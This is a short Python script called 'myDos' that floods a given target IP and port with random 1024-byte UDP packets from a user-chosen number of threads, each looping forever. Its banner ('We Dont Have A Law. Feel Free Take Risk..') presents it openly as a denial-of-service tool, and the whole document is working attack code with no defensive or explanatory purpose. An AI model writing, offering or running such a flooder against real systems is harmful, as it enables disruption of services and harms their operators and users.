import socket, time, random, sys, threading, optparse
from colorama import Fore, Style

def usage():
	print (''' \033[92m	myDos: AL104
	We Dont Have A Law. Feel Free Take Risk.. \n
	usage : python3 ddos.py [-s] [-p] [-t]
	-h : help
	-t : target ip
	-p : port default 80
	-a : Ammo/bullet/power default 10 \033[0m''')
	sys.exit()

read = optparse.OptionParser(add_help_option=False,epilog="myDos")
read.add_option('-t', '--target',dest='target',help='Target IP')
read.add_option('-a', '--ammo',dest='ammo',help='Enter amount of Ammo/bullet')
read.add_option('-p', '--port', dest='port')
read.add_option('-h','--help',dest='help',action='store_true',help='help you')
(value, key) = read.parse_args()
if value.help:
	usage()
if value.target is not None:
	target = value.target
else:
	usage()
if value.port is None:
	port = 80
else:
	port = value.port
if value.ammo is None:
	ammo = 10
else:
	ammo = value.ammo


def dos():
	try:
		bytes = random._urandom(1024)
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		x = 0

		while True:
			x += 1
			s.sendto(bytes, (target, port))
			print(f'[{x}] ammo shooting to ==>> {target}')

	except:
		print('shot miss!!')


print('starting to shoot...')

for p in range(0, int(ammo)):
	threading.Thread(target=dos).start()

print('execute done!')
